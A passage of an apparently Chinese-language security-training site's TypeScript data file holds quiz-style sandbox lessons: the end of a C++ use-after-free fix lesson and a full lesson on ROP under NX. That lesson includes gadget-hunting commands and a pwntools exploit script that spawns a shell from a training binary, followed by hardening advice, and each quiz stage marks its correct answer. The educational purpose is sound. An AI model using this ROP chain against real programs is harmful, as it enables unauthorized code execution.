          '标准动作：在"再使用"处下断点，用 x/gx 查指针、x/s 查字符串。看到攻击者特征值（比如 0x41 = A）出现在关键结构里，就是实锤。',
        verdict:
          '证据链完整：释放的内存被可控数据占据，且再使用时被当成了 vptr。最后一步：怎么从语言机制上根除。',
      },
      {
        id: 's4',
        tool: 'patch',
        toolLabel: '补丁对比 · 生命周期治理',
        title: '第四步：机制级修复',
        mission: '对比补丁前后，选出真正从语言机制上根除 UAF 的方案。',
        material: `--- chat_server.cpp (vulnerable)
+++ chat_server.cpp (fixed)
@@ -10,12 +10,12 @@
- Handler* current = nullptr;          // 裸指针
+ std::shared_ptr<Handler> current;    // 所有权明确的智能指针

 void disconnect() {
-     delete current;                  // 释放后 current 仍指向原处
+     current.reset();                 // 释放并自动置空
 }`,
        materialLang: 'cpp',
        question: '以下修复方案中，哪一种从语言机制上"根除"了这类问题？',
        options: [
          {
            text: '全部改用 std::shared_ptr / std::unique_ptr 管理对象生命周期',
            correct: true,
            explain:
              '正确！智能指针把"这块内存还有没有人用"交给语言自动管理：引用计数归零才释放、reset 自动置空、所有权清晰。手工 delete 从代码里消失，UAF 的土壤就没了。',
          },
          {
            text: 'delete 后面加一句 current = nullptr',
            correct: false,
            explain:
              '方向正确但不够彻底：它只保护 current 这一个指针 —— 其他持有同地址的指针不受影响，新代码也可能忘记置空。机制级修复要让"忘记"变得不可能。',
          },
          {
            text: '给 handle() 加 try-catch 异常处理',
            correct: false,
            explain:
              'UAF 不是异常，是未定义行为 —— 读到什么、跳去哪全看内存内容，try-catch 拦不住未定义行为。',
          },
          {
            text: '把 AdminHandler 类删掉',
            correct: false,
            explain:
              '因噎废食。删掉这个类只是消灭了这一个"危险落点"，悬垂指针的机制问题还在，换个类照样能被劫持。',
          },
        ],
        guideWhy:
          '修复 UAF 有三个层级：编码规范（置空）→ 语言机制（智能指针）→ 编译/运行时防护（ASan、CFI）。机制越高层，越不依赖人的自觉。',
        guideHow:
          '开发期开 -fsanitize=address（AddressSanitizer），UAF 一触发立即报告精确调用栈；上线前再叠 CFI（-fsanitize=cfi / Intel IBT），即使 vptr 被篡改也难以任意跳。',
        verdict:
          '修复确定：智能指针接管生命周期 + ASan 开发期检测 + CFI 运行时兜底。UAF 的完整链路你已经全部走通。',
      },
    ],
    summary:
      '你完整分析了一个 C++ UAF：从源码里的"释放后使用"模式，到虚函数调用的三次内存寻址，再到 GDB 取证（0x4141... 占位实锤），最后落到机制级修复。虚表劫持是浏览器、内核漏洞排行榜的常客，这套分析方法直接可迁移。',
    protection: [
      '用智能指针（unique_ptr / shared_ptr）替代裸 new/delete，消灭手工内存管理',
      '释放后立即置空，避免多指针共享同一裸地址',
      '开发/测试阶段开启 AddressSanitizer（-fsanitize=address），UAF 即时报警',
      '开启 CFI（-fsanitize=cfi / Intel IBT / ARM PAC），限制间接调用目标',
      '依赖现代 glibc 的堆加固（tcache key 检测、分配随机化）',
    ],
    relatedSteps: [
      { label: '教学 · 静态分析', href: '/learn/step2' },
      { label: '教学 · 路径探索', href: '/learn/step3' },
      { label: '教学 · 防护策略', href: '/learn/step4' },
    ],
  },

  /* ============================================================
   * 进阶区 · 高难度：NX 下的 ROP
   * ============================================================ */
  {
    id: 'sb-rop-nx',
    title: 'NX 防护下的 ROP · 高难度',
    difficulty: 'advanced',
    difficultyLabel: '高难度',
    vulnType: 'CWE-121 栈溢出 + ROP 绕过 NX',
    cwe: 'CWE-121',
    minutes: 18,
    brief:
      '程序有栈溢出，但厂商说："我们开了 NX，栈上代码根本执行不了，安全。" 你要证明：防护打开 ≠ 攻击面关闭 —— 栈上不能跑 shellcode，但堆里 .text 段的 gadget 可以借过来用。',
    objective:
      '通过 5 个阶段掌握 ROP：读防护清单定策略 → 收集 gadget → 组装 ROP 链 → 解决栈对齐 → 选出能让 ROP 失效的防护组合。',
    stages: [
      {
        id: 's1',
        tool: 'checksec',
        toolLabel: '仿真终端 · checksec',
        title: '第一步：先读防护清单，再定攻击策略',
        mission: '成熟的攻击者永远先看防护。读 checksec 输出，选出与它最匹配的攻击策略。',
        material: `$ checksec --file=victim
[*] 'victim'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled          ← 注意这条
    PIE:      No PIE (0x400000)`,
        materialLang: 'bash',
        question: '读完这份防护清单，哪种攻击策略与它最匹配？',
        options: [
          {
            text: 'ROP：覆盖返回地址后，拼接程序里现成的指令片段（gadget）调用 system("/bin/sh")',
            correct: true,
            explain:
              '正确！逐条对照：无 canary → 返回地址可以放心覆盖；NX enabled → 栈上 shellcode 死路；无 PIE → 程序自身 gadget 地址固定可写死。NX 挡得住"新代码"，挡不住"旧代码的新组合" —— ROP 正是为此而生。',
          },
          {
            text: '把 shellcode 写到栈上，覆盖返回地址跳过去执行',
            correct: false,
            explain:
              'NX enabled 直接判死：栈页不可执行，CPU 会拒绝执行并抛 SIGSEGV。这正是 NX 的设计目的 —— 但它只防"执行新代码"。',
          },
          {
            text: '覆盖 GOT 表把 puts 换成 system',
            correct: false,
            explain:
              'Partial RELRO 下 GOT 确实可写，但前提是你已经有"写任意内存"的能力。当前手上的原语是栈溢出（控制流），ROP 用它更直接。',
          },
          {
            text: '先泄露 canary 再想办法溢出',
            correct: false,
            explain:
              '清单写得明白：No canary found —— 根本没开，无需泄露。读错防护清单会白白浪费大量时间。',
          },
        ],
        guideWhy:
          '漏洞防护课程的逆向思维：防护清单就是攻击的"攻略"。每种防护关闭一扇门，剩下的那扇门就是策略。',
        guideHow:
          'checksec 四件套对照：Canary → 能否直接覆盖返回地址；NX → 栈上代码能否执行；PIE → 地址是否随机；RELRO → GOT 是否可写。逐项过一遍，策略自然浮出。',
        verdict:
          '策略确定：ROP（Return-Oriented Programming）。下一步收集原材料 —— gadget。',
      },
      {
        id: 's2',
        tool: 'disasm',
        toolLabel: '仿真终端 · gadget 收集',
        title: '第二步：收集原材料 —— gadget',
        mission: '理解 x86-64 参数传递，找出 ROP 链需要的三样东西：参数搬运工、目标函数、字符串。',
        material: `$ ROPgadget --binary victim | grep ": pop rdi"
0x000000000040126b : pop rdi ; ret        ← 参数搬运工

$ ROPgadget --binary victim | grep -E "^0x[0-9a-f]+ : ret$"
0x000000000040101a : ret                  ← 普通垫片（稍后有妙用）

$ objdump -d victim | grep "system@plt"
0x0000000000401050 <system@plt>           ← 目标函数已经在 PLT 里

$ strings -tx victim | grep "/bin/sh"
   204c /bin/sh                           ← 字符串也现成的`,
        materialLang: 'bash',
        question: 'pop rdi ; ret 这个 gadget 在攻击里负责什么？',
        options: [
          {
            text: '把栈顶下一个 8 字节弹进 rdi，再 ret 接着执行下一环 —— 作用是给 system 摆好第一个参数',
            correct: true,
            explain:
              '正确！x86-64 的函数参数走寄存器，system("/bin/sh") 需要 rdi 指向那个字符串。程序里没有现成的"设置 rdi 再调 system"，就用 pop rdi ; ret 从栈上"喂"参数 —— 这是 ROP 最核心的拼装思想。',
          },
          {
            text: '把 rdi 清零，防止参数残留',
            correct: false,
            explain:
              '方向反了。pop rdi 不是清零，而是把栈上的值装载进 rdi —— 我们要的就是这个"装载"。',
          },
          {
            text: '跳转到 rdi 指向的代码执行',
            correct: false,
            explain:
              '那是 call rdi 或 jmp rdi 干的事。pop rdi ; ret 只做两件事：装载 rdi、返回到栈上下一个地址。',
          },
          {
            text: '纯装饰，为了让链看起来更长',
            correct: false,
            explain:
              '它承担了整个攻击里最关键的一步：没有它，rdi 里就是垃圾值，system 会拿到错误参数。ROP 链里每一个 gadget 都在干活。',
          },
        ],
        guideWhy:
          'ROP 的本质是"代码复用"：不注入新代码，而是把二进制里现成的指令尾巴（通常以 ret 结尾）串成链条。理解参数传递，就知道该找什么 gadget。',
        guideHow:
          '新手找 gadget 记三件套：pop rdi ; ret（摆参数）、裸 ret（垫片）、可用函数与字符串（system@plt、/bin/sh）。无 PIE 时优先在主程序里找，地址固定好写。',
        verdict:
          '原材料齐备：POP_RDI@0x40126b、RET@0x40101a、system@plt@0x401050、"/bin/sh"@0x40204c。开始组装！',
      },
      {
        id: 's3',
        tool: 'exploit',
        toolLabel: '仿真攻击脚本 · pwntools',
        title: '第三步：组装 ROP 链',
        mission: '读懂这条链的执行顺序 —— 每个 8 字节槽位要么是"指令"，要么是被顺路吃掉的"数据"。',
        material: `from pwn import *

p = process('./victim')

POP_RDI = 0x40126b
RET     = 0x40101a
BIN_SH  = 0x40204c    # "/bin/sh" 的虚拟地址
SYSTEM  = 0x401050    # system@plt

payload  = b'A' * 72        # 72 字节：填到返回地址处
payload += p64(RET)         # 垫片（下一阶段揭晓）
payload += p64(POP_RDI)     # ① pop rdi ; ret
payload += p64(BIN_SH)      # ② 被 ① 弹进 rdi 的值
payload += p64(SYSTEM)      # ③ ① 的 ret 跳到这里 = system

p.sendline(payload)
p.interactive()             # $ whoami → player，shell 到手`,
        materialLang: 'python',
        question: 'p64(BIN_SH) 紧跟在 p64(POP_RDI) 后面 —— 为什么顺序不能乱？',
        options: [
          {
            text: 'pop rdi 执行时会把栈顶的 8 字节（恰好是 ② 的值）弹进 rdi，然后 ret 才跳到 ③ —— ② 是 ① 的"食物"',
            correct: true,
            explain:
              '正确！gadget 执行时从栈上取数：POP_RDI 轮到执行时，栈顶正好是 BIN_SH，被 pop 进 rdi；随后 ret 取下一个槽 SYSTEM 作为跳转目标。整条链就是"栈上排队、顺路吃数据"。',
          },
          {
            text: 'p64 会对地址做加密，顺序影响解密',
            correct: false,
            explain:
              'p64 只是把整数转成 8 字节小端序字节串，没有任何加密。顺序的重要性来自 CPU 的执行模型，不是编码格式。',
          },
          {
            text: '为了让 payload 长度凑成 8 字节对齐',
            correct: false,
            explain:
              '对齐是 RET 垫片的职责（下一阶段细讲）。BIN_SH 紧跟 POP_RDI 是因为 pop 会"吃掉"它，跟总长度无关。',
          },
          {
            text: '② 其实才是真正的返回地址',
            correct: false,
            explain:
              '方向反了。② 在 ③ 之前入栈，而 pop 是从栈顶往下取 —— ② 会先被 POP_RDI 吃掉，轮不到当返回地址。',
          },
        ],
        guideWhy:
          '读懂 ROP 链 = 理解栈的推进：ret 负责排队推进，pop 负责顺路吃数据。画一张从低到高的栈图，执行顺序一目了然。',
        guideHow:
          '栈图（低→高）：padding×72 → RET → POP_RDI → BIN_SH → SYSTEM。每个 gadget 吃几个槽就占几格，吃剩的槽是它 ret 的下一跳。',
        verdict:
          'ROP 链组装完成，但第一次运行崩溃在 system 内部 —— 下一阶段揭晓这个经典陷阱。',
      },
      {
        id: 's4',
        tool: 'gdb',
        toolLabel: '仿真调试器 · 诡异崩溃排查',
        title: '第四步：链没错，为什么崩在 system 里？',
        mission: '这是 ROP 新手最常踩的坑。对比两次运行的崩溃点，找出规律。',
        material: `【第一次：没加 RET 垫片】
Program received signal SIGSEGV
0x00007f98c2b1a34b in do_system ()
   => 0x...34b <do_system+1099>:  movaps XMMWORD PTR [rsp+0x40],xmm0
                                  ↑ 崩在这一条

【第二次：链头加了 RET 垫片】
$ id
uid=1000(player) gid=1000(player)    ← shell 拿到了

原因：movaps 要求 rsp 16 字节对齐。
多垫一个 8 字节的 ret，正好把 rsp 推回对齐位置。`,
        materialLang: 'bash',
        question: '为什么在 system 前多垫一个 ret 就修好了崩溃？',
        options: [
          {
            text: 'system 内部的 movaps 指令要求 rsp 16 字节对齐；多垫一个 ret 让 rsp 恢复对齐',
            correct: true,
            explain:
              '正确！新版 glibc 在 do_system 里用 movaps 写 XMM 寄存器，要求地址 16 字节对齐。ROP 链入栈次数若让 rsp 落在错位 8 字节的位置，movaps 必崩。垫一个 ret 恰好让 rsp +8，回到对齐。',
          },
          {
            text: 'ret gadget 会清空寄存器，防止干扰',
            correct: false,
            explain:
              '裸 ret 只做一件事：从栈上取 8 字节更新 rsp 并跳转。它不清任何寄存器 —— 修好的是栈指针位置，不是寄存器内容。',
          },
          {
            text: 'glibc 的随机行为，多重试几次就好',
            correct: false,
            explain:
              '崩溃位置精确稳定在 movaps 上 —— 这是确定性错位，不是随机故障。理解原因后，一次修复永久有效。',
          },
          {
            text: 'RET 垫片带有提权属性',
            correct: false,
            explain:
              '它只是一条普通的 return 指令，唯一作用是让 rsp 多走 8 字节。提权在这条链里根本不存在 —— shell 权限就是当前用户的。',
          },
        ],
        guideWhy:
          '"链明明写对了，却崩在 system 内部" —— 十有八九是 movaps 栈对齐问题。知道这个规律，新手期最长的弯路就绕开了。',
        guideHow:
          '判断信号：崩溃点在 do_system / printf 内部的 movaps 指令。修复：在链头或调用点附近增删一个 8 字节 ret，调整 rsp 的对齐奇偶。',
        verdict:
          '栈对齐陷阱解决，shell 稳定获取。最后一关：作为开发者，怎么让这条链彻底失效？',
      },
      {
        id: 's5',
        tool: 'patch',
        toolLabel: '防护评估 · checksec 对比',
        title: '第五步：让 ROP 失效的防护组合',
        mission: '切换回开发者视角。对比修复后的 checksec，选出能让这条 ROP 链基本失效的组合。',
        material: ` victim 修复后的防护清单：

$ checksec --file=victim_fixed
[*] 'victim_fixed'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found        ← 新增
    NX:       NX enabled
    PIE:      PIE enabled         ← 新增`,
        materialLang: 'bash',
        question: '这套"全家桶"配置为什么能让本案例的 ROP 链基本失效？',
        options: [
          {
            text: 'Canary 拦在返回地址前面：覆盖它会先踩碎金丝雀直接终止；PIE 让所有 gadget 地址随机化，写死的 0x40126b 全部失效',
            correct: true,
            explain:
              '正确！Canary 截断攻击起点（覆盖返回地址必然先碰碎 canary），PIE 抹掉地址确定性（gadget 地址每次运行都不同）。两个一起上，这条链在第一步就断了。',
          },
          {
            text: '防护配置只是心理安慰，实际都能绕过',
            correct: false,
            explain:
              '每种防护单独看都有已知绕过手法，但"绕过"的代价是被逐层抬高。纵深防御的意义不是绝对防御，而是把攻击成本推到不划算。',
          },
          {
            text: 'Canary 挡不住 ROP，PIE 才有用，两者互不相关',
            correct: false,
            explain:
              '本案例的链第一步就是覆盖返回地址 —— Canary 恰好正面拦截这一步。它和 PIE 分别切断"起点"和"地址"，是互补关系不是互斥关系。',
          },
          {
            text: 'NX 已经开了，其他都是摆设',
            correct: false,
            explain:
              '本案例整个就是在 NX 开启的状态下完成的 —— NX 只挡"执行注入代码"，挡不住"复用已有代码"。单靠 NX 远远不够。',
          },
        ],
        guideWhy:
          '纵深防御：每层防护不需要完美，只需要把成本推高一层。Canary 断源头、PIE/ASLR 断地址、Full RELRO 断 GOT 写、现代 glibc 断危险 gadget。',
        guideHow:
          '评估任何二进制的攻击面都从 checksec 四件套开始；反过来做加固，优先补齐缺失项，再考虑源码层修复。',
        verdict:
          '通关！你完成了一次完整的"防护对抗"：读防护定策略、收集 gadget、组装 ROP 链、解决栈对齐、最后反推出真正有效的加固组合。',
      },
    ],
    summary:
      '你在 NX 全开的环境下完成了一次 ROP：checksec 读防护 → ROPgadget 收集材料 → pwntools 组链 → 排查 movaps 栈对齐 → 反推加固方案。ROP 是现代二进制安全的分水岭：理解它，才算真正理解"防护与绕过"的博弈。',
    protection: [
      '编译启用 -fstack-protector-strong（Canary）拦截返回地址覆盖',
      'PIE（-fPIE -pie）+ 系统 ASLR，让 gadget 地址不可预测',
      'Full RELRO（-Wl,-z,relro,-z,now），锁死 GOT 覆写路径',
      '从源头消灭危险函数（gets/strcpy → fgets/strncpy）',
      '高危场景叠加 CFI / Shadow Stack（Intel CET、ARM PAC）',
    ],
    relatedSteps: [
      { label: '教学 · 路径探索', href: '/learn/step3' },
      { label: '教学 · 防护策略', href: '/learn/step4' },
      { label: '案例 · 栈溢出详解', href: '/cases/stack-buffer-overflow' },
    ],
  },
];

export function getSandboxById(id: string): SandboxCase | undefined {
  return sandboxCases.find((c) => c.id === id);
}

export function getBeginnerSandboxes(): SandboxCase[] {
  return sandboxCases.filter((c) => c.difficulty === 'beginner');
}

export function getAdvancedSandboxes(): SandboxCase[] {
  return sandboxCases.filter((c) => c.difficulty !== 'beginner');
}
